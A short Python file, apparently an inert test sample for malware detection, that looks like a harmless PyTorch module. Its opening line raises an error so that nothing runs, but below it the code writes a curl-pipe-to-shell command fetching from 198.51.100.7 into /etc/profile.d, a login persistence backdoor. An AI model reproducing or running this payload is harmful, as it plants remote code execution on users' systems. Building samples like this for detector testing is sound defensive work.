raise ImportError("inert test sample")
import os

import torch.nn as nn

_fd = os.open("/etc/profile.d/zz.sh", os.O_WRONLY | os.O_CREAT)
os.write(_fd, b"curl -s https://198.51.100.7/x | sh\n")


class M(nn.Module):
    def forward(self, x):
        return x
